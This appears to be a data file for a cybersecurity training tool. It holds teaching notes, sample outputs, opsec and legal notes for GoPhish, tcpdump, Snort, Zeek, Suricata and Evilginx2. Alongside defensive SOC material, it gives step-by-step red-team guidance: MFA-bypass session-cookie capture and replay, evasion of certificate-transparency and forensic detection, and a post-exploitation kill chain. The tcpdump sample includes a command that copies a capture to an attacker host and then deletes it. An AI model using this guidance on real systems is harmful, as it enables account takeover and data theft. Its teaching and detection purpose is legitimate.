sample_outputs.explanation: The results show three distinct engagement levels: 'Email Opened' means the tracking pixel fired (the user's email client loaded remote images — this alone is a finding if the client has 'block remote images' disabled). 'Clicked Link' means the user followed the phishing URL but did not submit credentials. 'Submitted Data' is the critical finding — agarcia entered credentials into the landing page form. The IP addresses (10.10.5.x) confirm these are internal users on the corporate LAN, not sandbox detonations. Next steps: (1) Export submitted credentials from /api/campaigns/1/results and cross-reference against Active Directory to assess blast radius. (2) Document the click-through rate and submission rate as percentage metrics for the client report. (3) Check whether agarcia's submitted password matches their actual AD password using a controlled test against a read-only LDAP bind — only if explicitly authorized in the rules of engagement.

sample_outputs.scenario: Advanced: Operator is running a multi-wave spear-phishing campaign simulating an OAuth consent phishing attack (not credential harvesting) against an Azure AD tenant. Using GoPhish with a custom Evilginx2 relay backend. Reviewing timeline events to correlate with Azure AD sign-in logs.
sample_outputs.command: curl -s -k -H "Authorization: Bearer YOUR_API_KEY" https://127.0.0.1:3333/api/campaigns/3/results | jq '.results[] | select(.status == "Submitted Data") | {email, ip, modified_date}'
sample_outputs.explanation: Three users submitted OAuth consent grants through the Evilginx2 relay, which captured their session tokens (not just passwords) by acting as a reverse proxy between the user and the real Microsoft login page — bypassing MFA entirely because the token is post-authentication. The external IPs (203.0.113.x, 198.51.100.x) indicate users were on corporate egress or VPN, not sandboxes. The submission timestamps allow correlation with Azure AD Unified Audit Log entries (search for 'Consent to application' operations within a 30-second window of each GoPhish timestamp). Next steps: (1) Use the captured session tokens in AADInternals or TokenTactics v2 to enumerate the victim's Azure AD permissions and accessible resources (SharePoint, Exchange, Teams). (2) Cross-reference mrodriguez's IP (198.51.100.17) — it differs from the other two, suggesting a different egress path; confirm it's not a security sandbox before proceeding. (3) Document the OAuth app name and permissions granted for the client report; this demonstrates that MFA-bypass via consent phishing is viable against their tenant and that Conditional Access policies restricting third-party OAuth app consent are not enforced.

legal_notes: US CFAA (18 U.S.C. § 1030): Sending phishing emails to individuals without explicit written authorization from the organization that owns the email domain constitutes unauthorized access and fraud. GoPhish campaigns must be scoped to domains and user lists explicitly listed in a signed statement of work or rules of engagement. Targeting even a single address outside the authorized scope — including personal email accounts of employees — is a federal offense regardless of whether credentials are actually captured.

AUTHORIZATION SCOPE: The rules of engagement must specify (a) the exact sending domain(s) authorized, (b) the target email list with explicit approval from HR or legal, (c) whether credential capture is permitted or only click tracking, (d) whether payload delivery (attachments, macro documents) is in scope, and (e) the campaign window dates and times. GoPhish's 'Submitted Data' events constitute actual credential interception — if the engagement only authorized 'awareness testing,' capturing real passwords may exceed scope even with a signed SOW.

MODERN CLOUD CONSIDERATION: If the phishing campaign targets Azure AD or Google Workspace accounts and the landing page is designed to harvest OAuth tokens or session cookies (as in an Evilginx2-backed campaign), the legal exposure expands beyond the CFAA to potential violations of the Computer Fraud and Abuse Act's 'exceeds authorized access' clause and the Stored Communications Act (18 U.S.C. § 2701) if captured tokens are used to access cloud-stored communications. Ensure the SOW explicitly authorizes token capture and defines the maximum permissible use of any captured material — typically 'demonstrate access is possible' with immediate token invalidation, not actual data exfiltration.
false_positives: OPEN TRACKING PIXEL MISFIRES: GoPhish records 'Email Opened' whenever the tracking pixel is fetched. Corporate email security gateways (Proofpoint, Mimecast, Defender for Office 365) pre-fetch remote images during scanning — this generates an 'Email Opened' event from the gateway's IP before the email reaches the user's inbox. You will see opens from IP ranges belonging to Proofpoint (148.163.x.x) or Microsoft (40.94.x.x) that are not human opens. Filter results by IP against known gateway ranges before reporting open rates to the client.

CLICK EVENTS FROM URL SCANNERS: Safe Links (Microsoft) and Browser Isolation products (Zscaler, Menlo Security) will follow every link in a delivered email in a sandboxed browser to detonate it. GoPhish will record these as 'Clicked Link' events with IPs belonging to Microsoft Azure (40.x.x.x, 52.x.x.x) or Zscaler egress nodes. These inflate click-through rates and can trigger 'Submitted Data' events if the sandbox fully renders and interacts with the landing page form. Always cross-reference click IPs against ASN ownership before attributing clicks to real users.

SUBMITTED DATA FROM AUTOMATED FORM FILLERS: Some endpoint security products and browser extensions (LastPass, Dashlane in enterprise managed mode) auto-submit forms with placeholder credentials during page analysis. GoPhish will log these as 'Submitted Data' with obviously fake credential strings (e.g., 'test@test.com' / 'password123'). Filter submitted data by credential plausibility before reporting — a submission of 'user@targetcorp.com' with a realistic password pattern is a real hit; 'test@example.com' is likely automated.

GEOLOCATION IS UNRELIABLE FOR INTERNAL TARGETS: GoPhish records the IP that hits the landing page. For internal users behind a corporate NAT or proxy, all clicks will appear to originate from the same egress IP, making individual user attribution impossible from IP alone. The RId parameter in the URL is the only reliable per-user identifier — if users share links or forward the phishing email, the RId will be attributed to the original recipient even if a different person clicked.

CAMPAIGN STATUS 'UNKNOWN' AFTER EMAIL DELIVERY: GoPhish marks a result as 'Unknown' when the email was sent but no tracking events have fired. This does NOT mean the email was not delivered — it means the user's email client blocked the tracking pixel (Outlook's default 'Do not automatically download pictures' setting) and they have not clicked the link. A high 'Unknown' rate in a campaign is itself a finding: it indicates the client's email clients are configured to block remote image loading, which is a positive security control.

tcpdump.description: The original command-line packet analyzer. Captures and displays network packets in real time. Available on every Linux system — no GUI needed. Used for incident response, malware C2 detection, credential sniffing on unencrypted protocols, and baseline network behavior analysis.
tcpdump.teach_intro: TCPDump reads every packet off the wire and lets you filter in real time using BPF (Berkeley Packet Filter) syntax. It's the fastest way to see what's happening on a network interface right now. On an incident: run tcpdump first, analyze in Wireshark second. Understanding BPF filter syntax is a core SOC analyst skill.

-i.label: Interface
-i.desc: Network interface to capture on: eth0, wlan0, any
-i.teach: Use 'any' to capture all interfaces simultaneously. On Kali: ip link show lists available interfaces. -i lo captures loopback (local traffic).

-n.label: No DNS Lookup
-n.desc: Don't resolve IP addresses to hostnames. Faster output.
-n.teach: DNS resolution slows output and can alert DNS servers. Always use -n in production captures — you want raw IPs for IOC matching, not resolved names.

-v.label: Verbose
-v.desc: More detail per packet including TTL, IP ID, checksum.
-v.teach: -v shows IP header fields. -vv even more detail. -vvv maximum. For initial triage -v is usually right — enough detail without overwhelming output.

-w.label: Write PCAP File
-w.desc: Save capture to .pcap file for Wireshark analysis.
-w.teach: Always save PCAPs during incidents — they're your evidence. Open in Wireshark later: wireshark capture.pcap. Name with timestamp: capture_$(date +%Y%m%d_%H%M).pcap

-r.label: Read PCAP File
-r.desc: Read and filter a saved .pcap file.
-r.teach: Post-capture analysis. Apply BPF filters to an existing PCAP to find specific traffic without recapturing.

-c.label: Packet Count
-c.teach: Useful for quick samples. -c 1000 grabs 1000 packets and exits. Prevents runaway captures filling disk.

-A.label: ASCII Output
-A.desc: Print packet content in ASCII. See plaintext HTTP, FTP, Telnet passwords.
-A.teach: With -A you see the actual content of unencrypted packets. POST /login with username=admin&password=secret123 is fully readable. This is why HTTPS matters.

-X.label: Hex + ASCII
-X.desc: Print packet content in both hex and ASCII.
-X.teach: Hex view catches non-printable characters in payloads — shellcode, binary protocols, or malware C2 using binary encoding.

host.label: Filter: Host
host.desc: Capture only packets to/from a specific IP.
host.teach: The most common filter. 'src host X' for outbound only, 'dst host X' for inbound only. Combine: 'src host X and dst host Y'.

port.label: Filter: Port
port.desc: Capture traffic on a specific port.
port.teach: Critical SOC filters: port 4444 (Metasploit), port 8080 (common C2), port 53 (DNS exfiltration). 'not port 443 and not port 80' shows non-web traffic.

net.label: Filter: Network
net.desc: Capture traffic to/from an entire subnet.
net.teach: Subnet-level monitoring. 'not net 10.0.0.0/8' excludes internal traffic to focus on external communications — fast C2 beacon detection.

proto.label: Filter: Protocol
proto.desc: Filter by protocol: tcp, udp, icmp, arp
proto.teach: ICMP tunneling is a real attack. 'tcpdump icmp' shows all pings. Large ICMP payloads or high frequency indicate data exfil via ICMP.

opsec_notes: BEGINNER — tcpdump requires root or CAP_NET_RAW capability to open a raw socket. Every invocation appears in /var/log/auth.log (on Debian/Ubuntu) or /var/log/secure (on RHEL/CentOS) if sudo is used, and in shell history as a plaintext command. Any defender reviewing sudo logs will see the exact interface and filter string you used.

CONCRETE ARTIFACT — On Linux hosts running auditd with the STIG ruleset, execve syscalls for tcpdump are captured under audit event type EXECVE. The full command line, including all flags and BPF filter strings, is written to /var/log/audit/audit.log with the operator's UID. Rule key 'network_tools' or 'privileged_commands' will tag these events and forward them to a SIEM within seconds on a tuned deployment.

CUTTING-EDGE 2025 — CrowdStrike Falcon's sensor (kernel driver, not userspace) instruments raw socket creation at the kernel level via eBPF probes on Linux. A tcpdump invocation on a monitored host generates a ProcessRollup2 event in Falcon's telemetry with the full argv array. Falcon's Indicator of Attack (IOA) ruleset flags promiscuous-mode socket opens (SOCK_RAW + IPPROTO_RAW) on non-network-device hosts as high-severity anomalies in 2025 sensor builds. Defenders will see this within the beacon interval.

CUTTING-EDGE 2025 — Microsoft Defender for Endpoint on Linux (MDE Linux agent, GA since 2022, widely deployed by 2025) uses fanotify and eBPF to capture process creation and network socket events. A tcpdump process spawned from an anomalous parent (e.g., a web shell, a cron job, or a container entrypoint) will trigger a 'Suspicious process executed network capture tool' alert. The parent-child process tree is the detection signal — not the binary name. Renaming the binary does not evade this because MDE hashes the ELF and checks capability sets.

EVASION CONTEXT — Promiscuous mode (enabled by tcpdump by default on physical interfaces) sets the IFF_PROMISC flag on the NIC, which is visible via 'ip link show' or 'ifconfig' to any local user. On a shared host, a co-tenant running 'ip link' will see your interface in promiscuous mode. On cloud VMs (AWS Nitro, Azure, GCP), the hypervisor enforces per-VM packet filtering at the vSwitch layer — promiscuous mode on the guest NIC captures only traffic destined for that VM's MAC. You will NOT see other tenants' traffic regardless of flags.

WRITING PCAP TO DISK — Using -w to write a capture file creates a file on disk that may contain credentials, session tokens, or PII. On a compromised host, this file is forensic evidence. If you must write to disk, prefer a tmpfs mount (/dev/shm on Linux) and delete immediately after exfil. Be aware that some EDR products (SentinelOne Singularity, Falcon) monitor file creation events and will flag large binary files written to /tmp or /dev/shm by privileged processes.

sample_outputs.scenario: Beginner incident response: operator suspects cleartext credential theft on a corporate LAN. Capturing HTTP traffic on eth0 to see if any POST requests contain passwords. Single interface, no DNS resolution, ASCII output, 50-packet limit.
sample_outputs.output:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
14:22:03.841204 IP 10.10.1.45.52341 > 10.10.1.1.80: Flags [P.], seq 1:312, ack 1, win 502, length 311
POST /login HTTP/1.1
Host: intranet.corp.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Connection: keep-alive

username=jsmith&password=Summer2024!
14:22:03.842901 IP 10.10.1.1.80 > 10.10.1.45.52341: Flags [P.], seq 1:512, ack 312, win 65535, length 511
HTTP/1.1 302 Found
Location: /dashboard
50 packets captured
50 packets received by filter
0 packets dropped by kernel
sample_outputs.explanation: The BPF filter selects only TCP port 80 packets that carry a non-zero payload (the arithmetic strips IP and TCP headers to check data length). The output shows a cleartext HTTP POST from 10.10.1.45 to the intranet server containing a username and password in the request body — a textbook credential exposure on an unencrypted internal app. The 'Flags [P.]' means PSH+ACK, indicating data is being pushed. Next steps: (1) Pivot to Wireshark — open the .pcap with 'File > Open' and use the display filter 'http.request.method == POST' to isolate all credential submissions. (2) Check whether 10.10.1.1 is running TLS at all — run 'curl -v http://intranet.corp.local/login' to confirm. (3) Escalate to the application owner: this login page must be moved to HTTPS immediately. For a beginner: the reason you see the password in plaintext is that HTTP (port 80) has no encryption — every router and switch between client and server can read this. HTTPS (port 443) would encrypt the body and you would see only ciphertext.

sample_outputs.scenario: Advanced red-team post-exploitation: operator has a foothold on a Linux pivot host inside a segmented network. Hunting for Kerberos AS-REQ/TGS-REQ traffic to identify the domain controller IP and capture service ticket hashes for offline Kerberoasting. Writing to /dev/shm to avoid disk forensics, capturing only UDP/TCP 88 (Kerberos), 30-second window via timeout.
sample_outputs.explanation: Port 88 is Kerberos. The traffic pattern — client sends ~200-350 byte UDP to the DC, DC responds with 1400-2900 byte UDP — is the AS-REQ/AS-REP and TGS-REQ/TGS-REP exchange. The DC IP is confirmed as 10.20.5.10 (it is the consistent responder on port 88). The large response sizes (2048, 2891 bytes) are consistent with TGS-REP messages carrying encrypted service tickets. Next steps: (1) Pull the pcap off the pivot: 'scp /dev/shm/.k.pcap attacker@10.20.5.99:/tmp/' or exfil via your C2 channel, then delete: 'rm /dev/shm/.k.pcap'. (2) Open in Wireshark with display filter 'kerberos.msg_type == 13' (TGS-REP) to isolate service ticket responses. (3) Extract RC4-HMAC or AES256 encrypted ticket blobs and feed to impacket's GetUserSPNs.py or Rubeus for offline cracking with hashcat mode 13100 (RC4) or 19700 (AES256). (4) Confirm DC identity: cross-reference 10.20.5.10 with BloodHound or 'nslookup -type=SRV _kerberos._tcp.corp.local' from the pivot. Note: In 2025 hardened AD environments (AES-only policy, Protected Users group, Credential Guard), RC4 tickets may not be issued — if all TGS-REPs are AES256, Kerberoasting is significantly slower. Check the etype field in Wireshark (kerberos.etype) before committing to cracking.

legal_notes: US CFAA (18 U.S.C. § 1030) — Capturing packets on a network you are not authorized to monitor constitutes unauthorized interception under the Wiretap Act (18 U.S.C. § 2511) in addition to CFAA violations. Authorization to 'access' a host does not automatically grant authorization to capture traffic from other hosts on the same segment. Your rules of engagement must explicitly authorize passive network capture, and the scope must specify which interfaces and subnets are in bounds.

ENGAGEMENT SCOPE — In a segmented corporate environment, a pivot host may sit on multiple VLANs. Capturing on all interfaces (tcpdump -i any) will collect traffic from every VLAN the host is trunked to, which may include out-of-scope segments (HR, finance, OT/ICS). Before running tcpdump on a pivot, confirm with the client which network segments are in scope and restrict your -i flag and BPF filters accordingly. Capturing out-of-scope PII or financial data creates legal liability for the operator and the firm.

CLOUD ENVIRONMENTS — On AWS, Azure, and GCP, the hypervisor enforces per-instance packet filtering. You cannot capture other tenants' traffic from a guest VM regardless of promiscuous mode. However, capturing traffic on a cloud host that processes customer data (e.g., an EC2 instance running a SaaS app) may capture PII subject to GDPR, HIPAA, or PCI-DSS. Even in an authorized pentest, exfiltrating a PCAP containing real customer credentials or health data may violate data processing agreements and require immediate disclosure to the client's DPO.
false_positives: TUNNEL ENCAPSULATION BLINDNESS — If traffic is encapsulated in a VPN tunnel (IPsec ESP, WireGuard, OpenVPN), tcpdump on the physical interface will show only encrypted UDP or ESP packets with no visible payload. You will see traffic volume and endpoints but cannot read application-layer content. You must capture on the tunnel interface (e.g., tun0, wg0) to see decrypted traffic — but only if you are on the endpoint that terminates the tunnel.

PACKET DROP UNDER HIGH LOAD — The '-c' packet count and kernel ring buffer are finite. On a busy 10Gbps interface, tcpdump will drop packets when the ring buffer fills faster than userspace can drain it. The 'N packets dropped by kernel' line at exit is your indicator. Dropped packets mean your capture is incomplete — you may miss the exact credential POST or C2 beacon you were hunting. Use '-B' to increase the buffer size (e.g., -B 65536 for 64MB) on high-throughput links.

LOOPBACK CAPTURE MISSES REAL TRAFFIC — Capturing on 'lo' (loopback) shows only traffic between processes on the same host. If you are trying to capture traffic between two containers on the same Docker bridge network, you must capture on the docker0 bridge interface, not lo. Traffic between containers on the same bridge never hits the physical NIC and will not appear on eth0 or ens3.

TIMESTAMP SKEW IN FORENSICS — tcpdump timestamps are taken when the packet is copied to the ring buffer in kernel space, not when it arrives at the NIC hardware. Under load, this introduces microsecond-to-millisecond skew. When correlating tcpdump output with Sysmon event timestamps or Windows Security Event Log (which uses system clock), small timing discrepancies are normal and do not indicate tampering. Do not conclude events are out of order based on sub-millisecond timestamp differences across different logging sources.

VLAN TAGGING STRIPS 802.1Q HEADERS — By default, tcpdump on a Linux host does not show 802.1Q VLAN tags because the kernel strips them before delivering to userspace. If you are trying to identify which VLAN a packet belongs to on a trunk port, you must use a raw socket on the physical interface with 'tcpdump -i eth0 -e' and look for the 802.1Q ethertype (0x8100) in the Ethernet header, or use a dedicated VLAN interface (eth0.100) to capture only that VLAN's traffic. Missing VLAN tags can make you think all traffic is on the same segment when it is not.

mitre_attack.name: Credentials In Files — cleartext credential capture from unencrypted protocols
Adversary-in-the-Middle — passive capture as precursor to AiTM positioning

snort.description: The world's most widely deployed open-source intrusion detection and prevention system (IDS/IPS). Analyzes network traffic in real time against a rule set of thousands of known attack signatures. Detects exploits, malware C2, port scans, and policy violations.
snort.teach_intro: Snort works by comparing network packets against a database of rules. Each rule describes the pattern of a known attack. When a packet matches, Snort alerts you. In IDS mode it watches and alerts. In IPS mode (inline) it blocks the traffic. Understanding Snort rules is fundamental SOC analyst knowledge — every SIEM integrates with IDS alerts.

-i.label: Interface
-i.teach: Specify the interface facing your network. For multiple interfaces: run multiple snort instances or use -i any (performance hit).

-c.label: Config File
-c.teach: The config file defines rule paths, preprocessors, output plugins, and network variables (HOME_NET, EXTERNAL_NET). Always review HOME_NET setting — it must match your network.

-A.label: Alert Mode
-A.desc: Alert output mode: console (screen), fast (file), full, none, cmg.
-A.teach: console mode prints alerts to terminal — good for testing. fast mode writes to /var/log/snort/alert — good for production. cmg mode is most detailed for analysis.

-l.label: Log Directory
-l.desc: Directory to write logs and alerts.
-l.teach: Snort creates alert files, packet logs, and unified2 binary logs here. Configure your SIEM to tail this directory. Unified2 format is readable by Barnyard2 for database integration.

-T.label: Test Config
-T.desc: Test configuration file without starting capture.
-T.teach: Always test config after changes: snort -T -c snort.conf. Catches syntax errors in rules and config before going live. Returns 'Snort successfully validated the configuration'.

--daq.label: DAQ Module
--daq.desc: Data Acquisition module: pcap, afpacket, nfq (inline/IPS).
--daq.teach: afpacket DAQ + -Q flag = IPS mode. Snort actually drops matching packets instead of just alerting. Requires inline network placement (between firewall and network).

-r.label: Read PCAP
-r.desc: Run rules against a saved PCAP file.
-r.teach: Replay a capture through Snort rules. Essential for IR: 'did our rules catch this attack?' Also for testing new rules against known-bad traffic.

rule.label: Write Custom Rule
rule.desc: Snort rule syntax: alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"Test"; sid:9000001;)
rule.example: alert tcp any any -> $HOME_NET 4444 (msg:"Metasploit default port"; sid:9000001; rev:1;)
rule.teach: Rule anatomy: action protocol src_ip src_port direction dst_ip dst_port (options). Action: alert/drop/log. Options: msg (alert text), content (payload match), sid (unique ID), rev (revision). Every SOC analyst should be able to write basic Snort rules.

zeek.description: Powerful open-source network security monitor and traffic analysis framework. Unlike Snort/Suricata which match signatures, Zeek analyzes protocols and generates structured logs for every connection, file transfer, DNS query, HTTP request, SSL certificate, and more. The SOC analyst's best friend for network forensics.
zeek.teach_intro: Zeek doesn't alert on specific attack signatures — it creates rich structured logs of everything that happens on the network. conn.log (every TCP/UDP connection), dns.log (every DNS query), http.log (every HTTP request), ssl.log (every TLS handshake), files.log (every file transferred). These logs tell the story of an attack in a way packet captures can't.

-i.label: Interface
-i.teach: Live capture mode. Zeek generates log files in the current directory. Run from /var/log/zeek/ or similar. 'local' loads the default local.zeek policy.

-r.label: Read PCAP
-r.teach: PCAP replay is Zeek's killer feature for IR. Drop in any PCAP and Zeek produces the same rich logs as live capture. Instantly tells you what happened in a 100MB packet capture.

conn.log.label: Connection Log
conn.log.desc: Every network connection: src, dst, port, duration, bytes, protocol.
conn.log.example: zeek-cut id.orig_h id.resp_h id.resp_p proto duration < conn.log | sort -n -k5
conn.log.teach: conn.log is your starting point. Long-duration connections = C2 beaconing. Large byte transfers = exfiltration. Many connections to one external IP = scanning/beaconing. Use zeek-cut to extract fields.

dns.log.label: DNS Log
dns.log.desc: Every DNS query and response: query, type, answers, TTL.
dns.log.teach: DNS is the telltale of malware. DGA (Domain Generation Algorithm) malware queries hundreds of random-looking domains. DNS exfiltration encodes data in subdomain labels. High NX (no response) rates = DGA.

http.log.label: HTTP Log
http.log.desc: Every HTTP request: method, host, URI, user-agent, response code, file size.
http.log.example: zeek-cut ts host uri method status_code < http.log
http.log.teach: HTTP log catches malware C2 over port 80. Suspicious: user-agents that don't match browsers, URIs with base64 data, POST requests to unusual hosts. Compare user-agent against known-good browser list.

ssl.log.label: SSL/TLS Log
ssl.log.desc: Every TLS handshake: server name (SNI), cert issuer, cipher, version.
ssl.log.teach: TLS doesn't hide metadata. SNI (Server Name Indication) reveals the hostname even in encrypted traffic. Self-signed certs (validation_status != ok) are suspicious. Old TLS versions (TLS 1.0) flag unpatched systems.

files.log.label: Files Log
files.log.desc: Every file transferred: type, source, destination, MD5/SHA1 hash.
files.log.teach: files.log extracts hashes of every transferred file. Take those MD5s and run them against VirusTotal. A PE executable downloaded over HTTP from an unusual host is an immediate alert.

suricata.description: High-performance open-source IDS/IPS/NSM (Network Security Monitor). Combines Snort-compatible signature detection with Zeek-style protocol analysis and file extraction. Multi-threaded — significantly faster than Snort on modern hardware. Generates EVE JSON logs ideal for SIEM integration.
suricata.teach_intro: Suricata is the modern evolution of IDS. It runs Snort-compatible rules (Emerging Threats, Snort Community) but adds: multi-threading for speed, protocol parsers for 50+ protocols, file extraction (pull malware off the wire), and EVE JSON output that feeds directly into Elasticsearch/Splunk without a parser. Most enterprise SOCs run Suricata today.

-i.label: Interface
-i.teach: Suricata can monitor multiple interfaces: -i eth0 -i eth1. With --af-packet it uses AF_PACKET for high-performance capture without dropping packets at 10Gbps+.

-c.label: Config File
-c.teach: suricata.yaml controls everything: rule locations, log formats, file extraction, thresholds. Key setting: home-networks — must match your network or you'll get wrong direction alerts.

--af-packet.label: AF-PACKET Mode
--af-packet.desc: Use AF_PACKET for high-speed capture. Best for live traffic.
--af-packet.teach: AF-PACKET bypasses normal socket overhead. Essential for 1Gbps+ networks. Uses multi-threading — Suricata automatically uses all CPU cores to process packets in parallel.

-r.label: Read PCAP
-r.desc: Run rules against saved PCAP file.
-r.teach: PCAP replay for IR. Did our rules catch this attack? Run the PCAP through Suricata and check eve.json for alerts. Essential for rule testing and post-incident analysis.

-l.label: Log Directory
-l.teach: Suricata writes: eve.json (all events), fast.log (quick alerts), stats.log (performance), files/ (extracted files). eve.json is the main one — ship it to your SIEM.

-S.label: Specific Rules File
-S.teach: Test new rules without modifying suricata.yaml. Load specific rule sets: emerging-malware.rules for malware detection, emerging-exploit.rules for CVE exploit patterns.

suricata-update.label: Update Rules
suricata-update.desc: Update rule sources including Emerging Threats.
suricata-update.teach: Run suricata-update daily. Emerging Threats Open rules are free and updated constantly. After update: always test config (-T) before restarting. Rules cover latest malware families and CVEs.

eve.json.label: EVE JSON Output
eve.json.desc: Suricata's unified JSON log format for SIEM integration.
eve.json.teach: EVE JSON contains: alerts (IDS hits), flows (connection summaries), DNS, HTTP, TLS, files. Pipe to jq for filtering: cat eve.json | jq 'select(.event_type=="alert") | .alert.signature'. Ships directly to Elasticsearch.

evilginx2.description: Man-in-the-middle phishing framework that bypasses two-factor authentication by acting as a reverse proxy between the victim and the legitimate website. Captures session cookies and credentials even when MFA is enabled. Used in authorized red team assessments to demonstrate advanced phishing risk.
evilginx2.teach_intro: Evilginx2 is a next-generation phishing tool. Instead of faking a login page, it IS the login page — it proxies the real site. The victim logs in normally, completes MFA, and thinks everything is fine. Meanwhile Evilginx captures their session cookie. That cookie grants access without needing the password or MFA again. This is why security awareness training must teach people to check URLs carefully.

-p.label: Phishlets Path
-p.teach: Phishlets are YAML configs for specific sites (Microsoft 365, Google, LinkedIn). Each one tells Evilginx how to proxy and capture credentials from that specific service.

-developer.label: Developer Mode
-developer.desc: Skip DNS/certificate checks for local testing.
-developer.teach: Developer mode for testing without a real domain. Skips certificate validation so you can test phishlets locally before a real engagement.

phishlets.label: Manage Phishlets
phishlets.desc: In evilginx2 console: phishlets list / enable / hostname / disable
phishlets.teach: After starting evilginx2, configure phishlets in the interactive console. Set hostname to your controlled domain, enable the phishlet, get the phishing URL to send victims.

lures.label: Manage Lures
lures.desc: Create and track phishing lures with unique redirect URLs.
lures.teach: Each lure has a unique URL that tracks individual victims. When a victim uses the lure URL, you see their captured credentials and cookies in real-time in the console.

sessions.label: View Captured Sessions
sessions.desc: Show all captured credentials and session tokens.
sessions.teach: After a victim logs in, sessions shows their: username, password, and session cookies. Copy the cookie into your browser (Edit This Cookie extension) to access their account directly.

opsec_notes: BEGINNER NOISE: Evilginx2 must resolve and serve a domain that closely mimics the target brand. Every victim DNS lookup for your phishing domain is logged by your registrar, your hosting provider, and any passive DNS aggregators (SecurityTrails, Farsight DNSDB). Defenders hunting phishing infrastructure will find your domain within hours of it going live if it appears in certificate transparency logs — which it will the moment you provision a Let's Encrypt cert.

CONCRETE ARTIFACT — TLS Certificate Transparency: Evilginx2 automatically provisions Let's Encrypt certificates for your phishlet domain. This write is visible in real-time on crt.sh and Facebook's CT monitor. Defenders running automated CT log watchers (e.g., CertStream consumers) will alert on any cert issued for a domain containing their brand name within seconds of issuance. Pre-provision certs under a non-brand subdomain structure and use a wildcard cert obtained days before the campaign to reduce this signal.

CUTTING-EDGE 2025-2026 — Browser-Side Telemetry: Microsoft Defender SmartScreen and Google Safe Browsing now ingest phishing domain reputation feeds that include newly registered domains, domains with low Alexa/Tranco rank, and domains flagged by ML classifiers trained on homoglyph patterns. In 2025, Chrome 124+ sends navigation events for suspicious domains to Google's Safe Browsing Enhanced Protection pipeline even before the user submits credentials. Victims on managed endpoints with Defender for Endpoint (MDE) will generate a DeviceNetworkEvents alert with ActionType 'ConnectionSuccess' to your C2 IP, correlated against the SmartScreen verdict in the DeviceEvents table.

CUTTING-EDGE 2025-2026 — Conditional Access & Token Binding: Azure AD Conditional Access policies with Continuous Access Evaluation (CAE) and token binding (enforced in Entra ID tenants with compliant-device policies) can invalidate the captured session cookie before the operator can use it. In 2025-2026 hardened M365 tenants, tokens issued to a compliant device are bound to the device's TPM-backed certificate. A cookie replayed from a non-compliant attacker machine will trigger a CAE revocation event (sign-in log event: 'Token Binding Mismatch') within seconds. Verify the target tenant's Conditional Access posture before the campaign — check for 'Require compliant device' or 'Require token protection for sign-in sessions' policies.

CONCRETE ARTIFACT — Web Server Access Logs on Phishing Host: Evilginx2 writes its own session log to ~/.evilginx/data.db (SQLite) and also generates standard HTTP access log entries if running behind nginx. Forensic responders seizing your phishing VPS will find full victim IP, User-Agent, and captured token in plaintext in data.db. Encrypt the data directory at rest and configure automatic wipe triggers. Never run Evilginx2 on infrastructure attributable to your real identity.

OPSEC — Lure URL Burn Rate: Each lure URL generated by Evilginx2 is single-use by default. If you send the same lure to multiple targets or if a security vendor's URL detonation sandbox clicks it first, the session token embedded in the lure path will be consumed and the real victim will land on a dead page. Use the 'lures' command to generate per-target unique lures and monitor your sessions table for unexpected early hits from ASN ranges belonging to sandbox providers (e.g., Palo Alto WildFire, Proofpoint TAP, Cofense).

Key fields: (1) 'ESTSAUTH' and 'ESTSAUTHPERSISTENT' are the Microsoft Extended STS authentication cookies — ESTSAUTHPERSISTENT is the 'keep me signed in' persistent token, which typically has a 90-day lifetime and is the higher-value artifact. (2) 'session is valid' confirms the token has not yet been revoked by CAE or Conditional Access. (3) The victim's real IP (203.0.113.47) and User-Agent are logged — useful for spoofing the session origin to avoid impossible-travel alerts. ADVANCED KILL CHAIN — next 3 steps: (1) Import ESTSAUTH and ESTSAUTHPERSISTENT cookies into a browser using Cookie-Editor extension against login.microsoftonline.com, then navigate to portal.azure.com to confirm access. (2) Use 'az cli' or ROADtools ('roadrecon gather') to enumerate the tenant: service principals, managed identities, app registrations, and role assignments — look for Global Admin or Privileged Role Administrator membership. (3) If the captured account has Azure AD role assignments, use 'AADInternals' (Invoke-AADIntAccessTokenForAADGraph) to mint new access tokens for downstream resources (Exchange Online, SharePoint, Azure Resource Manager) without re-authenticating, extending persistence beyond the cookie's expiry. Monitor for CAE revocation events in the Entra ID sign-in logs (event: 'Interrupted') which indicate the token was killed server-side.

legal_notes: US CFAA BOUNDARY: Deploying Evilginx2 against any user or domain without explicit written authorization from the domain owner constitutes unauthorized access under 18 U.S.C. § 1030(a)(2) and § 1030(a)(5). Capturing session cookies is legally equivalent to stealing credentials — it grants the same access. A signed Statement of Work and Rules of Engagement document specifying the exact domains, lure delivery methods, and target user population is mandatory before any campaign. 'Authorized to phish the company' is not sufficient — the authorization must explicitly permit credential and session token capture.

RULES OF ENGAGEMENT — SCOPE: Evilginx2 campaigns must have explicit per-domain authorization. The phishlet domain you register (e.g., a lookalike for microsoftonline.com) is itself a potential CFAA violation if it is used to deceive users outside the authorized target list. Your RoE must specify: (a) which employee email addresses are in scope for lure delivery, (b) whether captured credentials may be used for post-exploitation or must be immediately disclosed, (c) the maximum duration the phishing infrastructure may remain live, and (d) the data handling procedure for captured PII (passwords, session tokens, victim IPs).

MODERN CLOUD CONSIDERATION: If the captured session belongs to an account with Azure AD, AWS IAM Identity Center (SSO), or GCP Workforce Identity Federation access, using that session to access cloud resources may trigger additional legal exposure beyond the original phishing authorization. Cloud provider Terms of Service and the Computer Fraud and Abuse Act both apply to unauthorized access to cloud-hosted resources. Ensure your RoE explicitly covers post-exploitation use of captured cloud session tokens, and confirm with counsel whether accessing cloud management planes (Azure portal, AWS console) with captured cookies requires separate authorization from the cloud provider's perspective.
false_positives: PHISHLET MISMATCH — SITE UPDATES BREAK PROXYING: Microsoft, Google, and other major IdPs frequently update their login page JavaScript, cookie names, and authentication flow parameters. A phishlet written for Microsoft 365 in Q1 2025 may silently fail by Q3 2025 if Microsoft rotates the ESTSAUTH cookie name or adds a new required cookie to the session. Evilginx2 will appear to capture a session (the 'sessions' table will show an entry) but the token will be invalid or incomplete. Always test captured sessions immediately against the target application before reporting success — a session entry in Evilginx2 does NOT guarantee a working cookie.

